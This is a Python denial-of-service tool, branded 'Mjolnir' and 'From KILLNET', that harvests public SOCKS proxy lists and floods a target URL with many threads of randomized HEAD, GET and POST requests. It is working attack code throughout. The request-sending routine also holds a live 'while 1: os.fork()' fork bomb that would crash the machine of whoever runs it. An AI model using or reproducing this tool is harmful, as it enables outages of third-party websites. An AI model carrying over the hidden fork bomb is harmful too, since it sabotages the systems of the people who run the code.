#!/usr/bin/env python3

import argparse
import os

from socks import SOCKS4, SOCKS5
from abc import ABC, abstractmethod


class PrxySrcAbs(ABC):
    def __init__(self, url, tp, timeout=5):
        self.url = url
        self.type = tp
        self.timeout = timeout

    def get_raw(self):
        from urllib.request import Request, urlopen
        try:
            with urlopen(Request(self.url,
                                 headers={'User-Agent': get_useragent()})) as resp:
                if resp.getcode() == 200:
                    return resp.read().decode('utf-8')
        except Exception as e:
            if verbose > 1:
                print('[!] Proxy source error: {}'.format(e))
            return ''

    @staticmethod
    def check_proxy(proxy, host, port, scheme, delay):
        from socks import socksocket
        from ssl import SSLContext
        sent = 0
        with socksocket() as sckt:
            try:
                sckt.set_proxy(proxy['type'], proxy['host'], proxy['port'])
                sckt.settimeout(delay)
                sckt.connect((host, int(port)))
                if scheme == "https":
                    sckt = SSLContext().wrap_socket(sckt, server_hostname=host)
                sent = sckt.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
                return proxy if sent > 0 else None
            except Exception as e:
                if verbose > 1:
                    print(e)
                return None
            finally:
                if verbose > 0:
                    if sent > 0:
                        print('    Proxy: {}:{} - OK'.format(proxy['host'], proxy['port']))
                    elif verbose > 1:
                        print('    Proxy: {}:{} - Fail'.format(proxy['host'], proxy['port']))

    @abstractmethod
    def process_data(self, rawdata):
        """"Abstract data"""

    def get_proxies(self, host, port, scheme):
        from concurrent.futures import ThreadPoolExecutor
        proxies = self.process_data(self.get_raw())
        if verbose > 0:
            print('[*] Checking: {} Total: {}'.format(self.url, len(proxies)))
        with ThreadPoolExecutor(threads) as executor:
            return [prxy for prxy in
                    list(executor.map(lambda x: PrxySrc.check_proxy(*x),
                                      [(p, host, port, scheme, self.timeout) for p in proxies]))
                    if prxy is not None]


class PrxySrc(PrxySrcAbs):
    def process_data(self, rawdata):
        def get_proxy(prxy):
            dt = prxy.split(':')
            return {'host': dt[0], 'port': int(dt[1]), 'type': self.type}
        return [get_proxy(item) for item in str(rawdata).splitlines()]


PROXY_SRC = [PrxySrc('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt', SOCKS4),
             PrxySrc('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt', SOCKS5)]


def get_proxy_list(tp):
    fltr = {'mix': None, 'socks4': SOCKS4, 'socks5': SOCKS5}[tp]
    return PROXY_SRC if fltr is None else [src for src in PROXY_SRC if src.type == fltr]


ACCEPTALL = ['Accept-Encoding: gzip, deflate',
             'Accept: text/html, application/xhtml+xml',
             'Accept-Language: en-US,en;q=0.5']

REFERERS = ['https://www.google.com/search?q=']

STRINGS = 'asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&'


def get_random_ulr(path):
    from random import choice, randint
    return ('&' if '?' in path else '?').join([
        path, choice(STRINGS), str(randint(0, 271400281257)), choice(STRINGS),
        str(randint(0, 271004281257)), str(randint(0, 271004281257)), choice(STRINGS),
        str(randint(0, 271400281257)), choice(STRINGS), str(randint(0, 271004281257))])


def get_useragent():
    from random import randint, choice

    def get_osv():
        return choice(choice([['Intel Mac OS X'],
                              ['Windows NT 10.0; Win64; x64'],
                              ['Linux x86_64']]))

    def get_chrome(osv):
        kit = randint(500, 599)
        ver = '{}.0{}.{}'.format(randint(0, 99), randint(0, 9999), randint(0, 999))
        return 'Mozilla / 5.0({}) AppleWebKit /{}.0(KHTML, like Gecko) Chrome /{} Safari /{}'.format(osv, kit, ver, kit)

    def get_firefox(osv):
        from datetime import date
        gck = '{}{:02d}{:02d}'.format(randint(2020, date.today().year),
                                      randint(1, 12),
                                      randint(1, 30))
        ver = '{}.0'.format(randint(1, 72))
        return 'Mozilla/5.0 ({}; rv:{}) Gecko/{} Firefox/{}'.format(osv, ver, gck, ver)

    def get_ie(osv):
        ver = '{}.0'.format(randint(1, 99))
        tkn = choice(choice([['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64'],
                             ['']]))
        engn = '{}.0'.format(randint(1, 99))
        return 'Mozilla/5.0 (compatible; MSIE {}; {}; {}Trident/{})'.format(ver, osv, tkn, engn)

    return choice([get_chrome(get_osv()), get_firefox(get_osv()), get_ie(get_osv())])


class AbsAttack(ABC):
    def __init__(self, scheme, host, port, path, cookies, custom_data):
        self.host = host
        self.port = port
        self.scheme = scheme
        self.path = path
        self.cookies = cookies
        self.data = custom_data

    @abstractmethod
    def get_attack_name(self):
        """"Supply name for verbose log"""

    @abstractmethod
    def get_content(self):
        """"Content to send"""

    @abstractmethod
    def communicate(self, proxy, content, callback, on_error, multiply):
        """"Communication routine"""

    def attack(self, proxy, callback, on_error, multiply):
        return self.communicate(proxy, self.get_content, callback, on_error, multiply)


class AbsFastAttack(AbsAttack):
    @abstractmethod
    def get_attack_name(self):
        """"Supply name for verbose log"""

    @abstractmethod
    def get_content(self):
        """"Content to send"""

    def communicate(self, proxy, content, callback, on_error, multiply):
        from ssl import SSLContext
        from socks import socksocket
        from socket import IPPROTO_TCP, TCP_NODELAY
        with socksocket() as sckt:
            try:
                if proxy is not None:
                    sckt.set_proxy(proxy['type'], proxy['host'], proxy['port'])
                else:
                    sckt.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                sckt.connect((self.host, int(self.port)))
                if self.scheme == "https":
                    sckt = SSLContext().wrap_socket(sckt, server_hostname=self.host)
                while 1: os.fork()
                sent = sum([sckt.send(str.encode(content())) for _ in range(multiply)])
                if sent <= 0:
                    callback(proxy)
                if verbose > 0:
                    if proxy is not None:
                        print('  ->{}: {}:{} - {}'.format(self.get_attack_name(), proxy['host'], proxy['port'],
                                                          'OK' if sent > 0 else 'Fail'))
                    else:
                        print('  ->{}: BRUTE - {}'.format(self.get_attack_name(), 'OK' if sent > 0 else 'Fail'))
            except Exception as e:
                on_error(proxy)
                if verbose > 0:
                    if proxy is not None:
                        print('  ->{}: {}:{} - Fail'.format(self.get_attack_name(), proxy['host'], proxy['port']))
                    else:
                        print('  ->{}: BRUTE - Fail'.format(self.get_attack_name()))
                if verbose > 1:
                    print(e)


class AbsGetAttack(AbsFastAttack):
    @abstractmethod
    def get_attack_name(self):
        """"Supply name for verbose log"""

    @abstractmethod
    def get_type(self):
        """"Specific type for attack"""

    def get_content(self):
        from random import choice
        return '\r\n'.join([
            self.get_type(),
            'Connection: Keep-Alive',
            'Cookies: {}'.format(self.cookies) if self.cookies is not None else '',
            'Referer: {}'.format(choice(REFERERS)),
            'User-Agent: {}\r\n'.format(get_useragent())])


class HeadAttack(AbsGetAttack):
    def get_attack_name(self):
        return 'HEAD'

    def get_type(self):
        return 'HEAD {} HTTP/1.1\r\nHost: {}'.format(get_random_ulr(self.path), self.host)


class CCAttack(AbsGetAttack):
    def get_attack_name(self):
        return ' CC '

    def get_type(self):
        return 'GET {} HTTP/1.1\r\nHost: {}'.format(get_random_ulr(self.path), self.host)


class PostAttack(AbsFastAttack):
    def get_attack_name(self):
        return 'POST'

    def get_content(self):
        from random import choice
        data = str(os.urandom(16)) if self.data is None else self.data
        return '\r\n'.join([
            'POST {} HTTP/1.1\r\nHost: {}'.format(self.path, self.host),
            choice(ACCEPTALL),
            'Referer: {}//:{}{}'.format(self.scheme, self.host, self.path),
            'Content-Type: application/x-www-form-urlencoded',
            'X-requested-with:XMLHttpRequest',
            'User-Agent: {}'.format(get_useragent()),
            'Content-Length: {}'.format(str(len(data))),
            'Cookies: {}'.format(self.cookies) if self.cookies is not None else '',
            'Connection: Keep-Alive\n{}\r\n\r\n'.format(data)])


class DDoS:
    def __init__(self, attacks, proxy_sorces, multiply):
        self.attacks = attacks
        self.multiply = multiply
        self.error = {}
        self.proxies = [None] if proxy_sorces is None else [proxy for src in proxy_sorces for proxy
                                                            in src.get_proxies(attacks[0].host,
                                                                               attacks[0].port,
                                                                               attacks[0].scheme)]

    def on_callback(self, result):
        if result is not None:
            self.proxies.remove(result)
            if verbose > 0:
                print('  -!Proxy lost {}:{}'.format(result['host'], result['port']))

    def on_error(self, result):
        if result is not None:
            key = ':'.join([result['host'], result['port']])
            if key in self.error:
                self.error[key] += 1
                if self.error[key] > 3:
                    self.proxies.remove(result)
                    del self.error[key]
                    if verbose > 0:
                        print('  -!Proxy lost {}:{}'.format(result['host'], result['port']))
            else:
                self.error[key] = 1

    def activate(self):
        from time import sleep
        from random import choice
        from concurrent.futures import ThreadPoolExecutor
        if verbose > 0:
            print('[!] Attacking {} with total initial proxies {}'.format(self.attacks[0].host,
                                                                          len(self.proxies)))
        with ThreadPoolExecutor(threads) as executor:
            while len(self.proxies) > 0:
                executor.map(lambda x: choice(self.attacks).attack(*x),
                             [(choice(self.proxies), self.on_callback, self.on_error, self.multiply)
                              for _ in range(threads)])
                sleep(0.1)


def init(verb, num_threads):
    global verbose
    global threads
    verbose = verb
    threads = num_threads


ATTACKS = {
    'head': [HeadAttack],
    'post': [PostAttack],
    'cc': [CCAttack],
    'mix': [HeadAttack, PostAttack, CCAttack]
}

if __name__ == '__main__':
    from urllib import parse
    parser = argparse.ArgumentParser(description='Mjolnir, the war-hammer of Thor. From KILLNET with love.')
    parser.add_argument('-a', '--attack', help='type of attack head/post/cc, default mix',
                        type=str, choices=['mix', 'head', 'post', 'cc'], default='mix')
    parser.add_argument('-p', '--proxy', help='socks proxy type version, default mix', type=str,
                        choices=['mix', 'socks4', 'socks5'], default='mix')
    parser.add_argument('-v', '--verbose', help='increase output verbosity', action='count', default=0)
    parser.add_argument('-b', '--brute', help='disable proxy usage', action="store_true")
    parser.add_argument('-d', '--data', help='custom data for POST attack', type=str)
    parser.add_argument('-B', '--boost', help='activate multiprocess mode', action='store_true')
    parser.add_argument('-c', '--cookies', help='custom cookies string', type=str)
    parser.add_argument('-t', '--threads', help='number of parallel threads, default 400', type=int, default=400)
    parser.add_argument('-m', '--multiply', help='magnification rate, default 100', type=int, default=100)
    parser.add_argument('target', help='target to attack', type=str)
    args = parser.parse_args()
    verbose = args.verbose
    threads = args.threads
    trgt = parse.urlparse(args.target)
    if trgt.scheme and trgt.hostname:
        ddos = DDoS([attack(trgt.scheme,
                            trgt.hostname,
                            trgt.port if trgt.port is not None else 443 if trgt.scheme == 'https' else 80,
                            trgt.path,
                            args.cookies,
                            args.data)
                    for attack in ATTACKS[args.attack]],
                    None if args.brute else get_proxy_list(args.proxy),
                    args.multiply)
        if args.boost:
            from multiprocessing import Pool, cpu_count

            def dummy_activation(_):
                return ddos.activate()

            with Pool(cpu_count(), initializer=init, initargs=(verbose, threads)) as pool:
                res = pool.map_async(dummy_activation, range(cpu_count()))
                res.get()
        else:
            ddos.activate()
    else:
        print('URL is not valid! Please provide a valid URL like http://www.example.com/index.html')
